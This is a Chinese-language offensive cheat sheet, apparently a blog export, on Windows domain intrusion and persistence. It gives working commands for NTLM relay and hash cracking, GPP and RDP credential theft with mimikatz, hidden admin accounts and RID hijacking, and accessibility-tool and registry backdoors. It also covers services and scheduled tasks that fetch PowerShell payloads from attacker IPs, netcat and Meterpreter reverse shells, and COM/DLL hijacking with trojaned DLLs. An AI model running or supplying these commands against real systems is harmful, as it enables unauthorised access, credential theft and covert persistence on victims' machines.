<h5 id="中继攻击"><a href="#中继攻击" class="headerlink" title="中继攻击"></a>中继攻击</h5><pre><code>修改/etc/responder/Responder.conf文件，配置smb和http为Off，分别开启两个对话框，使用F参数启用WPAD欺骗浏览器，使用/usr/share/responder/tools中的MultiReplay.py进行中继攻击获得目标cmdshell。
&gt;Responder -I eth0 -v -F
&gt;python MultiReplay.py -t 192.168.0.115 -u ALL
</code></pre>
<p><img src="440.png" alt="image"><br><img src="441.png" alt="image"></p>
<h5 id="NTLMv2Hash破解"><a href="#NTLMv2Hash破解" class="headerlink" title="NTLMv2Hash破解"></a>NTLMv2Hash破解</h5><pre><code>使用hashcat破解 -m 5600为NTLMv2类型
&gt;hashcat -m 5600 pass.txt wordlists.txt
</code></pre>
<p><img src="442.png" alt="image"></p>
<h3 id="GPP-Password"><a href="#GPP-Password" class="headerlink" title="GPP-Password"></a>GPP-Password</h3><pre><code>域内机器可访问\\zone.com\SYSVOL\zone.com共享文件夹，翻看策略文件，查找groups.xml，ScheduledTasks\ScheduledTasks.xml，Printers\Printers.xml，Drives\Drives.xml，DataSources\DataSources.xml， Services\Services.xml等文件
</code></pre>
<p><img src="443.png" alt="image"></p>
<pre><code>使用powersploit脚本解密
</code></pre>
<p><img src="444.png" alt="image"></p>
<pre><code>使用msf的auxiliary/scanner/smb/smb_enum_gpp模块
</code></pre>
<p><img src="445.png" alt="image"></p>
<h3 id="WinRM无文件执行"><a href="#WinRM无文件执行" class="headerlink" title="WinRM无文件执行"></a>WinRM无文件执行</h3><pre><code>&gt;winrm quickconfig –q启动winrm
或PS&gt;Enable-PSRemoting -Force
生成木马并启动监听
</code></pre>
<p><img src="446.png" alt="image"><br><img src="447.png" alt="image"></p>
<pre><code>放入已获得权限的机器C盘中
内网另外机器中执行
&gt;net use \\192.168.0.115\c$
&gt;winrm invoke create wmicimv2/win32_process @&#123;commandline=&quot;\\192.168.0.115\c\index.exe&quot;&#125;
</code></pre>
<h3 id="添加域管命令"><a href="#添加域管命令" class="headerlink" title="添加域管命令"></a>添加域管命令</h3><pre><code>&gt;net user admin$ pass@123 /add /doamin
&gt;net group &quot;Domain admins&quot; admin$ /add /domain
</code></pre>
<h3 id="SSH密钥免密登录"><a href="#SSH密钥免密登录" class="headerlink" title="SSH密钥免密登录"></a>SSH密钥免密登录</h3><pre><code>&gt;ssh -i id_rsa user@192.168.0.110
</code></pre>
<h3 id="获取保存的RDP密码"><a href="#获取保存的RDP密码" class="headerlink" title="获取保存的RDP密码"></a>获取保存的RDP密码</h3><pre><code>位置
C:\Users\用户名\AppData\Local\Microsoft\Credentials
查看命令
&gt;cmdkey /list
&gt;mimikatz log
#dpapi::cred /in:C:\Users\administrator\AppData\Local\Microsoft\Credentials\D53BF8DC4D52D75463D46595907A4015
记录guidMasterKey: &#123;572115f2-80b1-4b1e-be1b-425f5c7a8bfd&#125;
#privilege::debug
#sekurlsa::dpapi
找到GUID为guidMasterKey的值下面的MasterKey: d928f5e02d2e9495f92bb…
#dpapi::cred /in:C:\Users\administrator\AppData\Local\Microsoft\Credentials\D53BF8DC4D52D75463D46595907A4015 /masterkey: d928f5e02d2e9495f92bb…
密码为CredentialBlob值。
</code></pre>
<h2 id="后门-amp-持久化-1"><a href="#后门-amp-持久化-1" class="headerlink" title="后门&amp;持久化"></a>后门&amp;持久化</h2><h3 id="影子用户"><a href="#影子用户" class="headerlink" title="影子用户"></a>影子用户</h3><pre><code>&gt;net user test$ test /add
&gt;net localgroup administrators test$ /add
注册表HKEY_LOCAL_MACHINE\SAM\SAM\
给予administrator SAM的完全控制和读取的权限
以下导出为1.reg
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\test$
记录HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\test$的默认类型000003EA
以下导出为2.reg
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA
默认administrator默认类型为000001F4
以下导出为3.reg
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4
把000001F4(3.reg)的F值粘贴到000003EA(2.reg)的F值
修改后导入
&gt;regedit /s 1.reg
&gt;regedit /s 2.reg
删除net user test$ /del
Powershell脚本
https://github.com/3gstudent/Windows-User-Clone/blob/master/Windows-User-Clone.ps1
需system权限
&gt;Create-Clone -u 要创建的 -p 密码 -cu 想要克隆的
</code></pre>
<p><img src="448.png" alt="image"><br><img src="449.png" alt="image"></p>
<h3 id="RID劫持"><a href="#RID劫持" class="headerlink" title="RID劫持"></a>RID劫持</h3><pre><code>利用场景：
激活guest修改rid为管理员的
修改低权限用户rid
劫持rid之前普通用户1的rid值
</code></pre>
<p><img src="450.png" alt="image"></p>
<pre><code>使用msf的post/windows/manage/rid_hijack模块
</code></pre>
<p><img src="451.png" alt="image"></p>
<pre><code>运行后可以看到已经变为超管的rid值
</code></pre>
<p><img src="452.png" alt="image"></p>
<pre><code>此时普通用户1登录系统是为超管权限
</code></pre>
<h3 id="Guest激活"><a href="#Guest激活" class="headerlink" title="Guest激活"></a>Guest激活</h3><pre><code>激活来宾账户，修改其密码，加入administrators组
&gt;net user guest /active:yes
&gt;net user guest 123qwe!@#
&gt;net localgroup administrators guest /ad
</code></pre>
<h3 id="映像劫持-1"><a href="#映像劫持-1" class="headerlink" title="映像劫持"></a>映像劫持</h3><h4 id="Sethc"><a href="#Sethc" class="headerlink" title="Sethc"></a>Sethc</h4><pre><code>&gt;move sethc.exe 1.exe
&gt;copy cmd.exe sethc.exe
5下shift调用cmd
</code></pre>
<h4 id="轻松使用"><a href="#轻松使用" class="headerlink" title="轻松使用"></a>轻松使用</h4><pre><code>注册表
计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
新建Utilman.exe，新建字符串值Debugger,指定为C:\Windows\System32\cmd.exe
&gt; REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f
</code></pre>
<h4 id="IFEO静默执行"><a href="#IFEO静默执行" class="headerlink" title="IFEO静默执行"></a>IFEO静默执行</h4><pre><code>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe 新建DWORD值GlobalFlag 16进制为200
创建：计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe字符串值：MonitorProcess=muma.exe
DWORD值ReportingMode=1
&gt;reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /f
&gt;reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v GlobalFlag /t REG_DWORD /d 512 /f
&gt;reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe&quot; /v ReportingMode /t REG_DWORD /d 1  /f
&gt;reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe&quot; /v MonitorProcess /t REG_SZ /d &quot;c:\windows\system32\cmd.exe&quot; /f
</code></pre>
<h3 id="注册表启动项"><a href="#注册表启动项" class="headerlink" title="注册表启动项"></a>注册表启动项</h3><pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
</code></pre>
<h4 id="MSF-9"><a href="#MSF-9" class="headerlink" title="MSF"></a>MSF</h4><pre><code>添加一个监听
Meterpreter&gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#39;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&#39;
查询是否添加成功
Meterpreter&gt; reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
Meterpreter&gt; reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
开启防火墙进站规则
&gt; netsh firewall add portopening TCP 444 &quot;name&quot; ENABLE ALL
重启
&gt; shutdown -r -t 0
</code></pre>
<h4 id="CMD-1"><a href="#CMD-1" class="headerlink" title="CMD"></a>CMD</h4><pre><code>查看注册表启动项
&gt;REG query &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
添加启动项
&gt;REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; /V &quot;windowsupdate&quot; /t REG_SZ /F /D &quot;c:\windows\temp\update.exe&quot;
删除启动项
&gt;REG delete &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; /V &quot;windowsupdate&quot; /f
</code></pre>
<h3 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h3><h4 id="加载powershell"><a href="#加载powershell" class="headerlink" title="加载powershell"></a>加载powershell</h4><pre><code>&gt;schtasks /Create /tn 名字 /tr 运行程序 /sc hourly /mo 1
&gt;schtasks /create /S TARGET /SC Weekly /RU &quot;NT Authority\SYSTEM&quot; /TN &quot;STCheck&quot; /TR &quot;powershell.exe -c &#39;iex (New-Object Net.WebClient).DownloadString(&#39;&#39;http://192.168.0.107:8080/Invoke-PowerShellTcp.ps1&#39;&#39;&#39;)&#39;&quot;
</code></pre>
<h4 id="执行exe"><a href="#执行exe" class="headerlink" title="执行exe"></a>执行exe</h4><pre><code>创建计划任务
&gt;schtasks /create /RL HIGHEST /F /tn &quot;windowsupdate&quot; /tr &quot;c:\windows\temp\update.exe&quot; /sc DAILY /mo 1 /ST 12:25 /RU SYSTEM
查看计划任务
&gt;schtasks /query | findstr &quot;windowsupdate&quot;
立即执行某项计划任务
&gt;schtasks /run /tn &quot;windowsupdate&quot;
删除某项计划任务
&gt;schtasks /delete /F /tn &quot;windowsupdate&quot;
普通用户权限计划任务
&gt;schtasks /create /F /tn &quot;windowsupdate&quot; /tr &quot;D:\user\zhangsan\file\windowsupdate.exe&quot; /sc DAILY /mo 1 /ST 12:25 
&gt;schtasks /query | findstr &quot;windowsupdate&quot; 
&gt;schtasks /run /tn &quot;windowsupdate&quot; 
&gt;schtasks /delete /F /tn &quot;windowsupdate&quot; 
&gt;schtasks /tn &quot;SysDebug&quot; /query /fo list /v
</code></pre>
<h3 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h3><h4 id="AppCertDlls"><a href="#AppCertDlls" class="headerlink" title="AppCertDlls"></a>AppCertDlls</h4><pre><code>注册表HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SessionManager\下新建AppCertDlls，新建名字为Default，值为c:\1.dll的项
#msfvenom –p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 –f dll &gt;/root/1.dll
Msf&gt;use exploit/multi/handler
Msf&gt;set payload windows/meterpreter/reverse_tcp
https://cdn.securityxploded.com/download/RemoteDLLInjector.zip
&gt; RemoteDLLInjector64.exe PID c:\1.dll
</code></pre>
<h4 id="AppInit-DLLs"><a href="#AppInit-DLLs" class="headerlink" title="AppInit_DLLs"></a>AppInit_DLLs</h4><pre><code>注册表HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Window\Appinit_Dlls下AppInit_DLLs设置为c:\1.dll，LoadAppInit_DLLs设置为1
</code></pre>
<h4 id="MSF-10"><a href="#MSF-10" class="headerlink" title="MSF"></a>MSF</h4><pre><code>Msf&gt;use post/windows/manage/reflective_dll_inject
Msf&gt;set session 1
Msf&gt;set pid 1234
Msf&gt;set path c:\\1.dll
Msf&gt;run
&amp;
migrate +pid
&amp;
Meterpreter&gt;run post/windows/manage/migrate
</code></pre>
<h3 id="登录初始化"><a href="#登录初始化" class="headerlink" title="登录初始化"></a>登录初始化</h3><pre><code>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon下添加Userinit值
&gt;Powershell.exe Set-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon&quot; -name Userinit -value &quot;C:\Windows\system32\userinit.exe,c:\muma.exe&quot;
计算机\HKEY_CURRENT_USER\Environment
创建键值UserInitMprLogonScript值为c:\muma.exe
&amp;
Powershell实现：
&gt;Set-ExecutionPolicy RemoteSigned 
保存ps1执行
Set-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon&quot; -name Userinit -value &quot;C:\Windows\system32\userinit.exe,powershell.exe -nop -w hidden -c $w=new-object net.webclient;$w.proxy=[Net.WebRequest]::GetSystemWebProxy();$w.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $w.downloadstring(&#39;http://192.168.2.11:8080/kaMhC1&#39;);&quot;
# powershell反弹shell的payload参照msf中的web_delivery模块
</code></pre>
<h4 id="屏幕保护程序"><a href="#屏幕保护程序" class="headerlink" title="屏幕保护程序"></a>屏幕保护程序</h4><pre><code>计算机\HKEY_CURRENT_USER\Control Panel\Desktop
SCRNSAVE.EXE - 默认屏幕保护程序，改为恶意程序(设置备份)
ScreenSaveActive - 1表示屏幕保护是启动状态，0表示表示屏幕保护是关闭状态
ScreenSaverTimeout - 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900（15分钟）
</code></pre>
<h3 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h3><pre><code>&gt;git clone https://github.com/khr0x40sh/metasploit-modules.git
&gt;mv metasploit-modules/persistence/mof_ps_persist.rb /usr/share/metasploit-framework/modules/post/windows/
&gt;reload_all
&gt;use post/windows/mof_ps_persist
&gt;set payload windows/x64/meterpreter/reverse_tcp
&gt;set lhost 192.168.0.108
&gt;set lport 12345
&gt;set session 1
&gt;run
</code></pre>
<p><img src="453.png" alt="image"></p>
<pre><code>&gt;use exploit/multi/handler
&gt;set payload windows/x64/meterpreter/reverse_tcp
&gt;set lhost 192.168.0.108
&gt;set lport 12345
&gt;set exitonsession false
</code></pre>
<p><img src="454.png" alt="image"></p>
<pre><code>重启后还会上线
</code></pre>
<p><img src="455.png" alt="image"></p>
<pre><code>清除后门，进入meterpreter，resource 生成的rc文件
停止MOF
&gt;net stop winmgmt
删除文件夹：C:\WINDOWS\system32\wbem\Repository\
&gt;net start winmgmt 
</code></pre>
<h3 id="WinRM端口复用"><a href="#WinRM端口复用" class="headerlink" title="WinRM端口复用"></a>WinRM端口复用</h3><pre><code>WinRM端口5985，win2012以上默认启动，2008开启命令
&gt;winrm quickconfig -q
2012启用端口复用
&gt;winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;
2008启用WinRM后修改端口为80
&gt;winrm set winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=&quot;80&quot;&#125;
后门连接和使用
本地开启WinRM并设置信任连接主机
&gt;winrm quickconfig -q
&gt;winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;
执行命令
&gt;winrs -r:http://10.1.1.100 -u:administrator -p:password ipconfig /all
获取cmdshell
&gt;winrs -r:http://10.1.1.100 -u:administrator -p:password cmd
</code></pre>
<p><img src="456.png" alt="image"></p>
<pre><code>只administrator允许远程登录WinRM，允许其他用户可以登录，执行注册表
&gt;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
</code></pre>
<h3 id="创建服务"><a href="#创建服务" class="headerlink" title="创建服务"></a>创建服务</h3><pre><code>重启维持nc
&gt;sc create ms binpath= &quot;cmd /K start c:\nc\nc64.exe -d 192.168.0.51 4567 -e cmd.exe&quot; start= delayed-auto error= ignore
重启维持psh
#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=11111 -f psh-reflection &gt;/var/www/html/xxx.ps1
&gt;sc create ms binpath= &quot;cmd /K start C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -nop -exec bypass -c \&quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/xxx.ps1&#39;)\&quot;&quot; start= delayed-auto error= ignore
</code></pre>
<p><img src="457.png" alt="image"></p>
<pre><code>重启维持Cobalt strike
配置监听器，生成web传递模块Powershell脚本
&gt;sc create ms binpath= &quot;cmd /K start C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.0.107:8080/a&#39;))\&quot;&quot; start= delayed-auto error= ignore
</code></pre>
<p><img src="458.png" alt="image"></p>
<pre><code>Delay执行大概2分钟上线
&gt;sc delete ms 卸载服务
Powershell
&gt;powershell.exe new-service -Name nuoyani -BinaryPathName &quot;C:\WINDOWS\Temp\360.exe&quot; -StartupType Automatic
&gt;$c2=&#39;new-&#39;;$c3=&#39;service -Name nuoyani -DisplayName OrderServ -BinaryPathName &quot;C:\accc.exe&quot; -StartupType Automatic&#39;; $Text=$c2+$c3;IEX(-join $Text)
</code></pre>
<h3 id="Bitadmin"><a href="#Bitadmin" class="headerlink" title="Bitadmin"></a>Bitadmin</h3><pre><code>创建下载任务
&gt;bitsadmin /create empire
下载的文件设置
&gt;bitsadmin /addfile empire %comspec% c:\windows\temp\1.exe
设置传输时运行的命令,MSFvenom生成dll放入temp目录
&gt;bitsadmin /SetNotifyCmdLine empire cmd.exe &quot;cmd.exe /c rundll32 c:\windows\temp\1.dll,0&quot;
(bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe &quot;/u /s /i:https://x.com/shell.sct scrobj.dll&quot;)
启动任务
&gt;bitsadmin /resume empire
列出所有用户的下载任务
&gt;bitsadmin /list /allusers /verbose
</code></pre>
<p><img src="459.png" alt="image"></p>
<pre><code>重启后也会上线
</code></pre>
<p><img src="460.png" alt="image"></p>
<pre><code>完成任务
&gt;bitsadmin /complete empire
&gt;bitsadmin /cancel &lt;Job&gt; //删除某个任务
&gt;bitsadmin /reset /allusers //删除所有任务
&amp;
&gt;bitsadmin /create mission
&gt;bitsadmin /addfile mission %comspec% %temp%\cmd.exe
&gt;bitsadmin.exe /SetNotifyCmdLine mission regsvr32.exe &quot;/u /s /i:http://192.168.0.107/shell.sct scrobj.dll&quot;
&gt;bitsadmin /Resume mission
</code></pre>
<h3 id="CLR-Injection"><a href="#CLR-Injection" class="headerlink" title="CLR Injection"></a>CLR Injection</h3><pre><code>劫持调用.net程序，开机启动
https://github.com/3gstudent/CLR-Injection/blob/master/CLR-Injection_x64.bat
</code></pre>
<p><img src="461.png" alt="image"><br><img src="462.png" alt="image"></p>
<pre><code>WMIC可替换为powershell
New-ItemProperty &quot;HKCU:\Environment\&quot; COR_ENABLE_PROFILING -value &quot;1&quot; -propertyType string | Out-Null
New-ItemProperty &quot;HKCU:\Environment\&quot; COR_PROFILER -value &quot;&#123;11111111-1111-1111-1111-111111111111&#125;&quot; -propertyType string | Out-Null

wmic ENVIRONMENT create name=&quot;COR_ENABLE_PROFILING&quot;,username=&quot;%username%&quot;,VariableValue=&quot;1&quot;
wmic ENVIRONMENT create name=&quot;COR_PROFILER&quot;,username=&quot;%username%&quot;,VariableValue=&quot;&#123;11111111-1111-1111-1111-111111111111&#125;&quot;
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll delete
SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D &quot;%CD%\msg_x64.dll&quot; /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F 
SET KEY=HKEY_CURRENT_USER\Software\Classes\WoW6432Node\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D &quot;%CD%\msg.dll&quot; /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F
添加全局变量
计算机\HKEY_CURRENT_USER\Environment
COR_ENABLE_PROFILING=1
COR_PROFILER=&#123;11111111-1111-1111-1111-111111111111&#125;
注册CLSID
计算机\HKEY_CURRENT_USER\Software\Classes\CLSID添加项&#123;11111111-1111-1111-1111-111111111111&#125;和它的子项InprocServer32
新建一个键ThreadingModel，键值为：Apartment，默认键值为dll路径
劫持explorer.exe
&gt;SET COR_ENABLE_PROFILING=1
&gt;SET COR_PROFILER=&#123;11111111-1111-1111-1111-111111111111&#125;
位置(新建)
HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;\InprocServer32默认值为恶意DLL
新建ThreadingModel值为Apartment
</code></pre>
<h3 id="COM-OBJECT-hijacking"><a href="#COM-OBJECT-hijacking" class="headerlink" title="COM OBJECT hijacking"></a>COM OBJECT hijacking</h3><h4 id="CAccPropServicesClass-and-MMDeviceEnumerato"><a href="#CAccPropServicesClass-and-MMDeviceEnumerato" class="headerlink" title="CAccPropServicesClass and MMDeviceEnumerato"></a>CAccPropServicesClass and MMDeviceEnumerato</h4><pre><code>无需超管权限，无需重启
https://github.com/3gstudent/COM-Object-hijacking
将恶意DLLbase64编码写入ps脚本
</code></pre>
<p><img src="463.png" alt="image"><br><img src="464.png" alt="image"></p>
<pre><code>执行后会在
%appdata%\Microsoft\Installer\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;目录释放2个文件，分别是x86和x64的dll
会在注册表中
HKEY_CURRENT_USER\Software\Classes\CLSID\
新建
&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;和子项默认指向恶意DLL
只要指向.net程序便可上线。如ie，mmc等
</code></pre>
<p><img src="465.png" alt="image"></p>
<h4 id="Explorer"><a href="#Explorer" class="headerlink" title="Explorer"></a>Explorer</h4><pre><code>注册表位置：HKCU\Software\Classes\CLSID\
创建项&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;
创建子项InprocServer32
Default的键值为恶意dll的绝对路径：C:\test\1.dll
创建键值： ThreadingModel REG_SZ Apartment
</code></pre>
<p><img src="466.png" alt="image"></p>
<pre><code>HKCU\Software\Classes\CLSID&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;
HKCU\Software\Classes\CLSID&#123;fbeb8a05-beee-4442-804e-409d6c4515e9&#125;
HKCU\Software\Classes\CLSID&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;
HKCU\Software\Classes\Wow6432Node\CLSID&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;
</code></pre>
<h3 id="Squibledoo"><a href="#Squibledoo" class="headerlink" title="Squibledoo"></a>Squibledoo</h3><pre><code>创建1.sct
</code></pre>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?XML version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptlet</span>&gt;</span></span><br><span class="line">&lt;registration</span><br><span class="line">  description=&quot;Component&quot;</span><br><span class="line">  progid=&quot;Component.WindowsUpdate&quot;</span><br><span class="line">  version=&quot;1.00&quot;</span><br><span class="line">  classid=&quot;&#123;20002222-0000-0000-0000-000000000002&#125;&quot;</span><br><span class="line">&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">registration</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">public</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">method</span> <span class="attr">name</span>=<span class="string">&quot;exec&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">public</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;JScript&quot;</span>&gt;</span></span><br><span class="line">  &lt;![CDATA[</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">new</span> ActiveXObject(<span class="string">&#x27;WScript.Shell&#x27;</span>).Run(<span class="string">&#x27;calc.exe&#x27;</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>创建COM对象
&gt;regsvr32.exe /s /i:http://192.168.0.107/1.sct scrobj.dll
触发
&gt;cscript 1.js
var test = new ActiveXObject(&quot;Component.TESTCB&quot;);
test.exec()
</code></pre>
<h3 id="DLL劫持-1"><a href="#DLL劫持-1" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><h4 id="劫持1"><a href="#劫持1" class="headerlink" title="劫持1"></a>劫持1</h4><pre><code>注册表
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls下添加 &quot;lpk.dll&quot;(若无，自己创建)
ExcludeFromKnownDlls可使KnownDLLs失效
需要重新启动电脑
查找可劫持的DLL：
1.启动程序
2.使用Process Explorer查看该应用程序启动后加载的DLL。
3.从已经加载的DLL列表中，查找在上述“KnownDLLs注册表项”中不存在的DLL。
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
4.编写第三步中获取到的DLL的劫持DLL。
5.将编写好的劫持DLL放到该应用程序目录下，重新启动该应用程序，检测是否劫持成功。
</code></pre>
<p><img src="467.png" alt="image"></p>
<pre><code>Explorer.exe启动调用winrar文件夹的RarExt.dll
Msf监听
</code></pre>
<p><img src="468.png" alt="image"></p>
<pre><code>复制dll文件到the-backdoor-factory文件夹中，加载恶意dll进原dll
&gt;python backdoor.py -f RarExt.dll -s reverse_shell_tcp_inline -P 12138 -H 192.168.0.107 指定为kali监听的IP和端口
</code></pre>
<p><img src="469.png" alt="image"></p>
<pre><code>生成好的dll在backdoored文件夹，传入靶机中，替换原dll文件，最好把原dll保存备份。
每次打开windows资源管理器的时候，即可上线。重启可维持
</code></pre>
<p><img src="470.png" alt="image"></p>
<h4 id="劫持2"><a href="#劫持2" class="headerlink" title="劫持2"></a>劫持2</h4><pre><code>使用
https://github.com/coca1ne/DLL_Hijacker
https://github.com/git20150901/DLLHijack_Detecter
查看要劫持的DLL的函数导出表，会直接生成cpp源码，重编译指向恶意代码
DLLHijack_Detecter可查看程序加载的不在KnownDLLs中的DLL
</code></pre>
<h4 id="MSDTC服务劫持"><a href="#MSDTC服务劫持" class="headerlink" title="MSDTC服务劫持"></a>MSDTC服务劫持</h4><pre><code>服务名称MSDTC,显示名称Distributed Transaction Coordinator
对应进程msdtc.exe,位于%windir%system32
C:\Windows\System32\wbem\
服务启动搜索注册表位置计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI
#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.51 LPORT=4444 -f dll -o /var/www/html/oci.dll
Oci.dll放入c:\windows\system32\
重启服务即可
&gt;taskkill /f /im msdtc.exe
</code></pre>
<h4 id="Rattler"><a href="#Rattler" class="headerlink" title="Rattler"></a>Rattler</h4><pre><code>自动化查找可劫持的DLL
https://github.com/sensepost/rattler
使用
&gt;Rattler_x64.exe calc.exe 1
会列出可被劫持的DLL
</code></pre>
<p><img src="471.png" alt="image"></p>
<pre><code>按程序读取DLL位置顺序，把恶意DLL放入程序同目录后，执行程序即可。
</code></pre>
<p><img src="472.png" alt="image"><br><img src="473.png" alt="image"></p>
<h3 id="DLL代理劫持右键"><a href="#DLL代理劫持右键" class="headerlink" title="DLL代理劫持右键"></a>DLL代理劫持右键</h3><pre><code>右键对应的注册表路径是
HKLM\Software\Classes\*\ShellEx\ContextMenuHandlers
使用autoruns查看加载的DLL
</code></pre>
<p><img src="474.png" alt="image"></p>
<pre><code>以rarext.dll为例
使用https://github.com/rek7/dll-hijacking创建代理DLL
注意修改parse.py中dumpbin.exe的位置
</code></pre>
<p><img src="475.png" alt="image"></p>
<pre><code>&gt;python3 parse.py -d rarext.dll
</code></pre>
<p><img src="476.png" alt="image"></p>
<pre><code>修改原DLL为rarext_.dll，重新生成解决方案命名为rarext.dll
将两个DLL放入原目录，重启
</code></pre>
<h3 id="使用AMSI扫描接口维持权限"><a href="#使用AMSI扫描接口维持权限" class="headerlink" title="使用AMSI扫描接口维持权限"></a>使用AMSI扫描接口维持权限</h3><pre><code>https://gist.github.com/b4rtik/48ef702603d5e283bc81a05a01fccd40
现amsi已经集成到win10以下组件中
UAC
PowerShell
Windows脚本（wscript.exe和cscript.exe）
JavaScript和VBScript
Office VBA宏
</code></pre>
<p><img src="721.png" alt="image"></p>
<pre><code>这里使用nc来反弹个shell
</code></pre>
<p><img src="722.png" alt="image"></p>
<pre><code>使用regsvr32注册dll或手动添加
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\GUID（默认）REG_SZ “提供程序描述”
